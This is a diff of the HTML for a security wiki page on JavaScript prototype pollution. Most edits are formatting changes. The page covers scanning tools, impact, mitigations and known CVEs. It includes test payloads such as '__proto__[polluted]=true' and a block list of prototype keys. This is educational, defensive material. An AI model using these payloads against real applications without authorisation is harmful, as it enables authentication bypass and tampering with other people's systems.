-  <a class="anchor" href="#burp-suite">#</a>
-</h2>
+<h2 id="burp-suite">Burp Suite<a class="anchor" href="#burp-suite">#</a></h2>
 <p>Use:</p>
 <ul>
 <li>Proxy</li>
@@ -2323,12 +1998,8 @@ hoek
 </ul>
 <p>Test payloads:</p>
 <pre tabindex="0"><code>__proto__[polluted]=true
-constructor[prototype][polluted]=true
-</code></pre><hr>
-<h2 id="dom-invader">
-  DOM Invader
-  <a class="anchor" href="#dom-invader">#</a>
-</h2>
+constructor[prototype][polluted]=true</code></pre><hr>
+<h2 id="dom-invader">DOM Invader<a class="anchor" href="#dom-invader">#</a></h2>
 <p>Burp DOM Invader can detect:</p>
 <ul>
 <li>Client-side prototype pollution</li>
@@ -2336,49 +2007,30 @@ constructor[prototype][polluted]=true
 <li>Exploitable gadgets</li>
 </ul>
 <hr>
-<h2 id="nuclei">
-  Nuclei
-  <a class="anchor" href="#nuclei">#</a>
-</h2>
+<h2 id="nuclei">Nuclei<a class="anchor" href="#nuclei">#</a></h2>
 <p>Example:</p>
 <pre tabindex="0"><code>nuclei-u https://target.com \
--tags prototype-pollution
-</code></pre><hr>
-<h2 id="semgrep">
-  Semgrep
-  <a class="anchor" href="#semgrep">#</a>
-</h2>
+-tags prototype-pollution</code></pre><hr>
+<h2 id="semgrep">Semgrep<a class="anchor" href="#semgrep">#</a></h2>
 <p>Search vulnerable patterns:</p>
-<pre tabindex="0"><code>semgrep--config=p/javascript .
-</code></pre><p>Detect:</p>
+<pre tabindex="0"><code>semgrep--config=p/javascript .</code></pre><p>Detect:</p>
 <ul>
 <li>Unsafe object assignments</li>
 <li>Prototype manipulation</li>
 </ul>
 <hr>
-<h2 id="codeql">
-  CodeQL
-  <a class="anchor" href="#codeql">#</a>
-</h2>
+<h2 id="codeql">CodeQL<a class="anchor" href="#codeql">#</a></h2>
 <p>Useful for identifying:</p>
 <ul>
 <li>User input flowing into object merge functions</li>
 <li>Prototype modification paths</li>
 </ul>
 <hr>
-<h2 id="dependency-scanners">
-  Dependency Scanners
-  <a class="anchor" href="#dependency-scanners">#</a>
-</h2>
+<h2 id="dependency-scanners">Dependency Scanners<a class="anchor" href="#dependency-scanners">#</a></h2>
 <p>Tools:</p>
-<pre tabindex="0"><code>npm audit
-</code></pre><pre tabindex="0"><code>snyk test
-</code></pre><p>Detect vulnerable npm packages.</p>
+<pre tabindex="0"><code>npm audit</code></pre><pre tabindex="0"><code>snyk test</code></pre><p>Detect vulnerable npm packages.</p>
 <hr>
-<h1 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h1>
+<h1 id="impact">Impact<a class="anchor" href="#impact">#</a></h1>
 <ul>
 <li><strong>Authentication Bypass</strong>
 Attackers can modify authorization properties such as <code>isAdmin</code>, <code>role</code>, or permission flags.</li>
@@ -2398,90 +2050,74 @@ Polluted built-in properties can break application logic and cause runtime excep
 Since prototypes are shared globally, a single successful pollution attack may affect multiple users.</li>
 </ul>
 <hr>
-<h1 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h1>
+<h1 id="tools">Tools<a class="anchor" href="#tools">#</a></h1>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Burp Suite Professional</td>
-<td>Manual testing, payload injection, DOM analysis</td>
-</tr>
-<tr>
-<td>Burp DOM Invader</td>
-<td>Client-side prototype pollution detection</td>
-</tr>
-<tr>
-<td>Nuclei</td>
-<td>Automated vulnerability detection templates</td>
-</tr>
-<tr>
-<td>Semgrep</td>
-<td>Static analysis for vulnerable JavaScript patterns</td>
-</tr>
-<tr>
-<td>CodeQL</td>
-<td>Source-code data flow analysis</td>
-</tr>
-<tr>
-<td>Snyk</td>
-<td>Dependency vulnerability scanning</td>
-</tr>
-<tr>
-<td>npm audit</td>
-<td>Node.js dependency security checks</td>
-</tr>
-<tr>
-<td>Retire.js</td>
-<td>Detect vulnerable JavaScript libraries</td>
-</tr>
-<tr>
-<td>DevTools Console</td>
-<td>Verify prototype pollution</td>
-</tr>
-<tr>
-<td>JS-beautifier</td>
-<td>Analyze minified JavaScript</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Burp Suite Professional</td>
+					<td>Manual testing, payload injection, DOM analysis</td>
+			</tr>
+			<tr>
+					<td>Burp DOM Invader</td>
+					<td>Client-side prototype pollution detection</td>
+			</tr>
+			<tr>
+					<td>Nuclei</td>
+					<td>Automated vulnerability detection templates</td>
+			</tr>
+			<tr>
+					<td>Semgrep</td>
+					<td>Static analysis for vulnerable JavaScript patterns</td>
+			</tr>
+			<tr>
+					<td>CodeQL</td>
+					<td>Source-code data flow analysis</td>
+			</tr>
+			<tr>
+					<td>Snyk</td>
+					<td>Dependency vulnerability scanning</td>
+			</tr>
+			<tr>
+					<td>npm audit</td>
+					<td>Node.js dependency security checks</td>
+			</tr>
+			<tr>
+					<td>Retire.js</td>
+					<td>Detect vulnerable JavaScript libraries</td>
+			</tr>
+			<tr>
+					<td>DevTools Console</td>
+					<td>Verify prototype pollution</td>
+			</tr>
+			<tr>
+					<td>JS-beautifier</td>
+					<td>Analyze minified JavaScript</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h1 id="prevention--mitigation">
-  Prevention &amp; Mitigation
-  <a class="anchor" href="#prevention--mitigation">#</a>
-</h1>
-<h2 id="block-dangerous-properties">
-  Block Dangerous Properties
-  <a class="anchor" href="#block-dangerous-properties">#</a>
-</h2>
+<h1 id="prevention--mitigation">Prevention &amp; Mitigation<a class="anchor" href="#prevention--mitigation">#</a></h1>
+<h2 id="block-dangerous-properties">Block Dangerous Properties<a class="anchor" href="#block-dangerous-properties">#</a></h2>
 <p>Reject:</p>
 <pre tabindex="0"><code>__proto__
 prototype
-constructor
-</code></pre><p>Example:</p>
+constructor</code></pre><p>Example:</p>
 <pre tabindex="0"><code>constblocked= [
 &#34;__proto__&#34;,
 &#34;prototype&#34;,
 &#34;constructor&#34;
-];
-</code></pre><hr>
-<h2 id="validate-user-input">
-  Validate User Input
-  <a class="anchor" href="#validate-user-input">#</a>
-</h2>
+];</code></pre><hr>
+<h2 id="validate-user-input">Validate User Input<a class="anchor" href="#validate-user-input">#</a></h2>
 <p>Do not directly merge user-controlled objects.</p>
 <p>Bad:</p>
-<pre tabindex="0"><code>Object.assign(config,userInput)
-</code></pre><p>Good:</p>
-<pre tabindex="0"><code>schema.validate(userInput)
-</code></pre><p>Use:</p>
+<pre tabindex="0"><code>Object.assign(config,userInput)</code></pre><p>Good:</p>
+<pre tabindex="0"><code>schema.validate(userInput)</code></pre><p>Use:</p>
 <ul>
 <li>JSON Schema</li>
 <li>Joi</li>
@@ -2489,60 +2125,33 @@ constructor
 <li>Yup</li>
 </ul>
 <hr>
-<h2 id="avoid-unsafe-deep-merge-functions">
-  Avoid Unsafe Deep Merge Functions
-  <a class="anchor" href="#avoid-unsafe-deep-merge-functions">#</a>
-</h2>
+<h2 id="avoid-unsafe-deep-merge-functions">Avoid Unsafe Deep Merge Functions<a class="anchor" href="#avoid-unsafe-deep-merge-functions">#</a></h2>
 <p>Avoid:</p>
-<pre tabindex="0"><code>_.merge(target,input)
-</code></pre><p>without validation.</p>
+<pre tabindex="0"><code>_.merge(target,input)</code></pre><p>without validation.</p>
 <p>Use updated libraries.</p>
 <hr>
-<h2 id="use-objectcreatenull">
-  Use Object.create(null)
-  <a class="anchor" href="#use-objectcreatenull">#</a>
-</h2>
+<h2 id="use-objectcreatenull">Use Object.create(null)<a class="anchor" href="#use-objectcreatenull">#</a></h2>
 <p>Normal object:</p>
-<pre tabindex="0"><code>constobj= {};
-</code></pre><p>inherits:</p>
-<pre tabindex="0"><code>Object.prototype
-</code></pre><p>Safer:</p>
-<pre tabindex="0"><code>constobj=Object.create(null);
-</code></pre><p>No prototype inheritance.</p>
+<pre tabindex="0"><code>constobj= {};</code></pre><p>inherits:</p>
+<pre tabindex="0"><code>Object.prototype</code></pre><p>Safer:</p>
+<pre tabindex="0"><code>constobj=Object.create(null);</code></pre><p>No prototype inheritance.</p>
 <hr>
-<h2 id="use-hasownproperty-checks">
-  Use hasOwnProperty Checks
-  <a class="anchor" href="#use-hasownproperty-checks">#</a>
-</h2>
+<h2 id="use-hasownproperty-checks">Use hasOwnProperty Checks<a class="anchor" href="#use-hasownproperty-checks">#</a></h2>
 <p>Bad:</p>
-<pre tabindex="0"><code>if(user.isAdmin)
-</code></pre><p>Better:</p>
+<pre tabindex="0"><code>if(user.isAdmin)</code></pre><p>Better:</p>
 <pre tabindex="0"><code>if(
 Object.prototype.hasOwnProperty.call(user,&#34;isAdmin&#34;)
-)
-</code></pre><p>Prevents inherited properties from being trusted.</p>
+)</code></pre><p>Prevents inherited properties from being trusted.</p>
 <hr>
-<h2 id="freeze-object-prototypes">
-  Freeze Object Prototypes
-  <a class="anchor" href="#freeze-object-prototypes">#</a>
-</h2>
+<h2 id="freeze-object-prototypes">Freeze Object Prototypes<a class="anchor" href="#freeze-object-prototypes">#</a></h2>
 <p>Example:</p>
-<pre tabindex="0"><code>Object.freeze(Object.prototype);
-</code></pre><p>Prevents modification of built-in prototypes.</p>
+<pre tabindex="0"><code>Object.freeze(Object.prototype);</code></pre><p>Prevents modification of built-in prototypes.</p>
 <hr>
-<h2 id="update-dependencies">
-  Update Dependencies
-  <a class="anchor" href="#update-dependencies">#</a>
-</h2>
+<h2 id="update-dependencies">Update Dependencies<a class="anchor" href="#update-dependencies">#</a></h2>
 <p>Keep packages updated:</p>
-<pre tabindex="0"><code>npm update
-</code></pre><p>Regularly review:</p>
-<pre tabindex="0"><code>npm audit
-</code></pre><hr>
-<h2 id="secure-object-merging">
-  Secure Object Merging
-  <a class="anchor" href="#secure-object-merging">#</a>
-</h2>
+<pre tabindex="0"><code>npm update</code></pre><p>Regularly review:</p>
+<pre tabindex="0"><code>npm audit</code></pre><hr>
+<h2 id="secure-object-merging">Secure Object Merging<a class="anchor" href="#secure-object-merging">#</a></h2>
 <p>Use safe merge libraries that:</p>
 <ul>
 <li>Block prototype keys</li>
@@ -2550,36 +2159,20 @@ Object.prototype.hasOwnProperty.call(user,&#34;isAdmin&#34;)
 <li>Prevent recursive prototype modification</li>
 </ul>
 <hr>
-<h2 id="disable-dangerous-object-mutation">
-  Disable Dangerous Object Mutation
-  <a class="anchor" href="#disable-dangerous-object-mutation">#</a>
-</h2>
+<h2 id="disable-dangerous-object-mutation">Disable Dangerous Object Mutation<a class="anchor" href="#disable-dangerous-object-mutation">#</a></h2>
 <p>Avoid:</p>
-<pre tabindex="0"><code>obj[userInput]=value;
-</code></pre><p>when keys are user controlled.</p>
+<pre tabindex="0"><code>obj[userInput]=value;</code></pre><p>when keys are user controlled.</p>
 <hr>
-<h1 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h1>
-<h2 id="research-papers">
-  Research Papers
-  <a class="anchor" href="#research-papers">#</a>
-</h2>
+<h1 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h1>
+<h2 id="research-papers">Research Papers<a class="anchor" href="#research-papers">#</a></h2>
 <ul>
 <li><a href="https://www.ndss-symposium.org/wp-content/uploads/2022-308-paper.pdf" target="_blank" rel="noreferrer noopener nofollow">Client-side prototype pollution</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://portswigger.net/research/server-side-prototype-pollution" target="_blank" rel="noreferrer noopener nofollow">Server-side prototype pollution</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets" target="_blank" rel="noreferrer noopener nofollow">Prototype pollution gadgets</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
 <hr>
-<h2 id="notable-vulnerabilities">
-  Notable Vulnerabilities
-  <a class="anchor" href="#notable-vulnerabilities">#</a>
-</h2>
-<h3 id="cve-2019-11358httpssecuritysnykiovulnsnyk-js-jquery-174006">
-  <a href="https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006" target="_blank" rel="noreferrer noopener nofollow">CVE-2019-11358</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
-  <a class="anchor" href="#cve-2019-11358httpssecuritysnykiovulnsnyk-js-jquery-174006">#</a>
-</h3>
+<h2 id="notable-vulnerabilities">Notable Vulnerabilities<a class="anchor" href="#notable-vulnerabilities">#</a></h2>
+<h3 id="cve-2019-11358"><a href="https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006" target="_blank" rel="noreferrer noopener nofollow">CVE-2019-11358</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"><a class="anchor" href="#cve-2019-11358">#</a></h3>
 <p>jQuery <code>$.extend(true,...)</code> prototype pollution vulnerability.</p>
 <p>Impact:</p>
 <ul>
@@ -2587,31 +2180,21 @@ Object.prototype.hasOwnProperty.call(user,&#34;isAdmin&#34;)
 <li>DOM XSS</li>
 </ul>
 <hr>
-<h3 id="lodash-prototype-pollution">
-  Lodash Prototype Pollution
-  <a class="anchor" href="#lodash-prototype-pollution">#</a>
-</h3>
+<h3 id="lodash-prototype-pollution">Lodash Prototype Pollution<a class="anchor" href="#lodash-prototype-pollution">#</a></h3>
 <p><a href="https://security.snyk.io/vuln/SNYK-JS-LODASH-608086" target="_blank" rel="noreferrer noopener nofollow">https://security.snyk.io/vuln/SNYK-JS-LODASH-608086</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://security.snyk.io/vuln/SNYK-JS-LODASH-15053838" target="_blank" rel="noreferrer noopener nofollow">https://security.snyk.io/vuln/SNYK-JS-LODASH-15053838</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p>Affected functions:</p>
 <pre tabindex="0"><code>_.merge()
-_.defaultsDeep()
-</code></pre><p>Impact:</p>
+_.defaultsDeep()</code></pre><p>Impact:</p>
 <ul>
 <li>Authentication bypass</li>
 <li>Remote code execution in specific applications</li>
 </ul>
 <hr>
-<h3 id="kibana-prototype-pollutionhttpssecuritysnykiovulnsnyk-js-kibana-9376712">
-  <a href="https://security.snyk.io/vuln/SNYK-JS-KIBANA-9376712" target="_blank" rel="noreferrer noopener nofollow">Kibana Prototype Pollution</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
-  <a class="anchor" href="#kibana-prototype-pollutionhttpssecuritysnykiovulnsnyk-js-kibana-9376712">#</a>
-</h3>
+<h3 id="kibana-prototype-pollution"><a href="https://security.snyk.io/vuln/SNYK-JS-KIBANA-9376712" target="_blank" rel="noreferrer noopener nofollow">Kibana Prototype Pollution</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"><a class="anchor" href="#kibana-prototype-pollution">#</a></h3>
 <p>Prototype pollution vulnerabilities affecting Elasticsearch/Kibana components.</p>
 <hr>
-<h1 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h1>
+<h1 id="references">References<a class="anchor" href="#references">#</a></h1>
 <ul>
 <li>PortSwigger Web Security Academy - Prototype Pollution<a href="https://portswigger.net/web-security/prototype-pollution" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/prototype-pollution</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li>OWASP JavaScript Security Cheat Sheet<a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-top-ten/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2629,49 +2212,62 @@ _.defaultsDeep()
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Prototype%20Pollution.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Privilege Escalation</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Race-Conditions/" class="flex align-center">
+        <span>Race Conditions</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2791,9 +2387,9 @@ _.defaultsDeep()
         <li><a href="#research-papers">Research Papers</a></li>
         <li><a href="#notable-vulnerabilities">Notable Vulnerabilities</a>
           <ul>
-            <li><a href="#cve-2019-11358httpssecuritysnykiovulnsnyk-js-jquery-174006"><a href="https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006">CVE-2019-11358</a></a></li>
+            <li><a href="#cve-2019-11358">CVE-2019-11358</a></li>
             <li><a href="#lodash-prototype-pollution">Lodash Prototype Pollution</a></li>
-            <li><a href="#kibana-prototype-pollutionhttpssecuritysnykiovulnsnyk-js-kibana-9376712"><a href="https://security.snyk.io/vuln/SNYK-JS-KIBANA-9376712">Kibana Prototype Pollution</a></a></li>
+            <li><a href="#kibana-prototype-pollution">Kibana Prototype Pollution</a></li>
           </ul>
         </li>
       </ul>
@@ -2803,15 +2399,24 @@ _.defaultsDeep()
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
